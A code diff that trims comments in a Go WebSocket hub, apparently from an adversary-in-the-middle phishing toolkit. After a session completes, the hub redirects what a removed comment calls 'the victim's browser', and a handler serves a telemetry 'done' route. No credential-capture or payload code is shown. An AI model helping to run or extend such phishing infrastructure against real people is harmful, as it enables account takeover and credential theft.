@@ -12,8 +12,7 @@ import (
 	"github.com/travisbale/mirage/internal/aitm"
 )
 
-// redirectMsg is the JSON payload sent to the victim's browser over WebSocket
-// when session completion fires.
+// redirectMsg is sent over WebSocket when a session completes, triggering the browser redirect.
 type redirectMsg struct {
 	RedirectURL string `json:"redirect_url"`
 }
@@ -32,7 +31,6 @@ type WSHub struct {
 	logger   *slog.Logger
 }
 
-// NewWSHub creates a WSHub and subscribes to EventSessionCompleted on bus.
 func NewWSHub(bus eventSubscriber, logger *slog.Logger) *WSHub {
 	hub := &WSHub{
 		upgrader: websocket.Upgrader{
@@ -45,7 +43,6 @@ func NewWSHub(bus eventSubscriber, logger *slog.Logger) *WSHub {
 	return hub
 }
 
-// listenCompletions fans out EventSessionCompleted events to all waiting connections.
 func (h *WSHub) listenCompletions(bus eventSubscriber) {
 	completionCh := bus.Subscribe(aitm.EventSessionCompleted)
 	for event := range completionCh {
@@ -65,9 +62,8 @@ func (h *WSHub) listenCompletions(bus eventSubscriber) {
 	}
 }
 
-// HandleUpgrade upgrades an HTTP connection to WebSocket, waits for the session
-// to complete, then sends the redirect message and closes.
-// Route: GET /ws/{sid}
+// HandleUpgrade handles GET /ws/{sid}: blocks until the session completes,
+// then sends the redirect URL and closes the connection.
 func (h *WSHub) HandleUpgrade(w http.ResponseWriter, r *http.Request, sessionID string) {
 	conn, err := h.upgrader.Upgrade(w, r, nil)
 	if err != nil {
@@ -98,8 +94,6 @@ func HandleTelemetryDone(store interface {
 	GetSession(id string) (*aitm.Session, error)
 }) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
-		// Extract session ID from the path: /t/{sid}/done
-		// Simple path parsing: last component before /done is the session ID.
 		path := r.URL.Path
 		var sessionID string
 		for i := len(path) - 1; i >= 0; i-- {
